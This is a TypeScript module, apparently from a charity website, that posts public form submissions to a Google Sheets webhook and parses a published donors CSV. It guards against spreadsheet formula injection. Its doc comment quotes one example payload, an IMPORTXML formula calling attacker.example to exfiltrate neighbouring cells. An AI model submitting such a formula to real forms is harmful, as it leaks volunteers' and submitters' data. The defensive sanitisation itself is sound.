// Strip whitespace and any stray BOM (﻿) the value may have picked up
// on its way into Vercel's env store — piping a URL via PowerShell prepends
// a UTF-8 BOM, which then makes fetch throw "Failed to parse URL from …"
// at request time.
const clean = (v: string | undefined) => v?.replace(/^[\s﻿]+|[\s﻿]+$/g, "");
const WEBHOOK_URL = clean(process.env.GOOGLE_SHEET_WEBHOOK_URL);
const DONORS_CSV_URL = clean(process.env.GOOGLE_SHEET_DONORS_CSV_URL);

export type SheetForm = "report" | "volunteer" | "adoption" | "bite";

export interface SheetPayload {
  form: SheetForm;
  data: Record<string, string>;
}

/**
 * Neutralise spreadsheet formula injection.
 *
 * Every value here originates in an anonymous public form and is appended to
 * the volunteers' spreadsheet by the Apps Script webhook. Google Sheets
 * evaluates any cell whose text begins with = + - @ (or a leading tab/CR) as a
 * formula, so a "name" of
 *   =IMPORTXML(CONCAT("https://attacker.example/?d=",A2),"//a")
 * exfiltrates the neighbouring cells to an attacker the moment a volunteer
 * opens the sheet — and HYPERLINK() can phish the team in their own tab.
 *
 * Prefixing with an apostrophe forces the cell to text. Sheets treats the
 * apostrophe as a formatting marker and does not display it, so a phone number
 * like "+919876…" still reads correctly to the volunteer.
 */
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

function sanitizeSheetData(data: Record<string, string>): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(data)) {
    out[key] = typeof value === "string" ? neutralizeFormula(value) : value;
  }
  return out;
}

export async function submitToGoogleSheet(payload: SheetPayload): Promise<boolean> {
  if (!WEBHOOK_URL) {
    console.error("[sheets] WEBHOOK_URL is not set");
    return false;
  }
  payload = { ...payload, data: sanitizeSheetData(payload.data) };
  try {
    // Google Apps Script webhooks reject requests with a JSON content-type
    // (they return a redirect and drop the body). Send as text/plain — Apps
    // Script's doPost still receives the JSON in e.postData.contents.
    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "text/plain;charset=utf-8" },
      body: JSON.stringify(payload),
      redirect: "follow",
    });
    if (!res.ok) {
      const body = await res.text().catch(() => "<no body>");
      console.error(`[sheets] webhook non-ok: ${res.status} ${res.statusText} body=${body.slice(0, 200)}`);
    }
    return res.ok;
  } catch (err) {
    console.error("[sheets] webhook threw:", err instanceof Error ? err.message : err);
    return false;
  }
}

export interface SheetDonor {
  name: string;
  date: string;
  amount: number;
}

/**
 * Fetches the published Donors sheet as CSV. Preferred schema:
 *   Name | Date | Amount
 * A legacy schema with a Campaign Slug column between Date and Amount is
 * also accepted so the wall keeps working while the sheet is being
 * migrated. Amount is always taken from the LAST integer-parseable column
 * on the row. A row with no such column is dropped; a row with a missing
 * or unparseable date is kept (rendered as "—" by the wall and pushed to
 * the bottom of the sort).
 */
export async function fetchDonorsFromSheet(): Promise<SheetDonor[] | null> {
  if (!DONORS_CSV_URL) return null;
  try {
    // Hard timeout: this runs during the /donate static build. A published
    // Google Sheet CSV is occasionally slow, and without a cap the fetch hangs
    // until Next's 60s prerender limit and fails the whole build (observed on
    // Vercel). 8s is generous for a small CSV; on timeout we abort and fall
    // back to the demo donor wall rather than blocking the deploy.
    const res = await fetch(DONORS_CSV_URL, {
      next: { revalidate: 300 },
      redirect: "follow",
      signal: AbortSignal.timeout(8000),
    });
    if (!res.ok) return null;
    const text = await res.text();
    const lines = text.trim().split(/\r?\n/).slice(1);
    return lines
      .map((line) => {
        const cols = line
          .split(",")
          .map((c) => c.trim().replace(/^"|"$/g, ""));
        // Amount = last cell whose digits parse to a positive integer.
        // Tolerates any middle columns (e.g. legacy Campaign Slug).
        let amount = 0;
        for (let i = cols.length - 1; i >= 2; i--) {
          const cleaned = cols[i].replace(/[₹,\s]/g, "");
          const n = parseInt(cleaned, 10);
          if (Number.isFinite(n) && n > 0) {
            amount = n;
            break;
          }
        }
        return {
          name: cols[0] || "Anonymous",
          date: cols[1] || "",
          amount,
        };
      })
      .filter((d) => d.amount > 0);
  } catch {
    return null;
  }
}
